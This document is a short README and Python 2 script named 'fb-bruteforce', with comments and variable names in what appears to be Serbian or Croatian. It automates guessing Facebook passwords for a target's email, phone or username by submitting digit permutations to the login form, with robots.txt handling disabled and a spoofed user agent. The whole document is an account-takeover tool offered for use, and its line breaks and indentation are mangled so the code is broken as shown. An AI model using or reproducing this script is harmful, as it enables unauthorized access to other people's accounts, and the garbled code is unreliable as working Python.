//////////////////////////////////////////////////////////////////////////
# fb-bruteforce
simple python bruteforce script using itertools and mechanize for facebook
open linux terminal use <b>python</b> <b>script.py</b> hit enter and enter <b>mail</b> or <b>phone</b> or <b>username</b>
with quotes
phone example<b>'06xxxxxxxxx'</b>
mail example<b>'example@mail.com'</b>
username example<b>'example.name'</b>
//////////////////////////////////////////////////////////////////////////
#!/usr/bin/python # -*- coding: utf-8 -*-
import mechanize import
itertools brauzer = mechanize.Browser()
kolacici = mechanize.CookieJar()
brauzer.set_cookiejar(kolacici)
brauzer.set_handle_refresh(True)
brauzer.set_handle_redirect(True)
brauzer.set_handle_robots(False) 
brauzer.addheaders = [('User-agent', 'Mozilla/1.0 (compatible; MSIE 1.0; Windows NT 1.1)')]
pokusaj=itertools.permutations("0123456789",10)
url="http://m.facebook.com/home.php"
brauzer.open(url)
brauzer.select_form(nr = 0)
email=input('mail:')
print brauzer.title()
for broj in pokusaj: brauzer.open(url)
brauzer.select_form(nr = 0)
brauzer.form['email']=email
brauzer.form['pass']=''.join(broj)
print 'Kombinacija:',brauzer.form['pass']
odgovor=brauzer.submit()
if brauzer.title()=="Facebook":
print ('lozinka je:',''.join(broj))
break
if brauzer.title()=="Please try again later": 
print("'Please try again later'(blokada zbog mnogo pokusaja!!!)")
break
